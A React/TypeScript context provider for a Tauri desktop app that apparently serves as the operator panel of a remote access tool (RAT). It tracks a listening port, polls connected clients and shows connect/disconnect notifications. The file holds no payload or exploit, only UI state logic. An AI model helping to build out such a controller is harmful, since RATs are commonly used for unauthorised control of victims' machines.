import React, { useState, useEffect, useRef } from "react";
import { RATContext } from "./RATContext";
import { invoke } from "@tauri-apps/api/tauri";
import { listen } from "@tauri-apps/api/event";
import toast from "react-hot-toast";
import { RATState, RATClient, RATProviderProps } from "../../types";

export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
  const [port, setPort] = useState<string>("1337");
  const [running, setRunning] = useState<boolean>(false);
  const [clientList, setClientList] = useState<RATClient[]>([]);
  const [notificationClient, setNotificationClient] = useState<boolean>(true);
  const notificationClientRef = useRef(false);
  const [listenClientNotif, setListenClientNotif] = useState<boolean>(false);

  const [selectedClient, setSelectedClient] = useState<string>("");

  async function fetchClients() {
    setClientList(await invoke("fetch_clients"));
  }

  async function fetchState() {
    const state: RATState = await invoke("fetch_state");
    const running = state.running;
    setRunning(running);
  }

  useEffect(() => {
    if (!running) return;

    fetchClients();
    fetchState();

    const clientsInterval = setInterval(fetchClients, 10000);
    const stateInterval = setInterval(fetchState, 1000);

    return () => {
      clearInterval(clientsInterval);
      clearInterval(stateInterval);
    };
  }, [running]);

  const customToast = (icon: string, toast_message: string, style: string) => {
    return toast(toast_message, {
      icon,
      className: `${style} text-lg`,
    });
  };

  async function waitNotification(type: string) {
    listen(type, (event) => {
      let icon = type == "client_connected" ? "🤙" : "👋";
      let message = type == "client_connected" ? "connected" : "disconnected";
      let style =
        type == "client_connected"
          ? "!bg-primary !text-primary-content"
          : "!bg-neutral !text-neutral-content";
      let toast_message = `Client ${event.payload} has ${message}!`;

      fetchClients();
      if (notificationClientRef.current)
        customToast(icon, toast_message, style);
    });
  }

  useEffect(() => {
    if (!listenClientNotif) {
      setListenClientNotif(true);
      waitNotification("client_connected");
      waitNotification("client_disconnected");
    }
  }, [listenClientNotif]);

  useEffect(() => {
    notificationClientRef.current = notificationClient;
  }, [notificationClient]);

  const RATdata = {
    port,
    setPort,
    fetchClients,
    setRunning,
    running,
    clientList,
    setSelectedClient,
    selectedClient,
    setNotificationClient,
    notificationClient,
  };

  return <RATContext.Provider value={RATdata}>{children}</RATContext.Provider>;
};
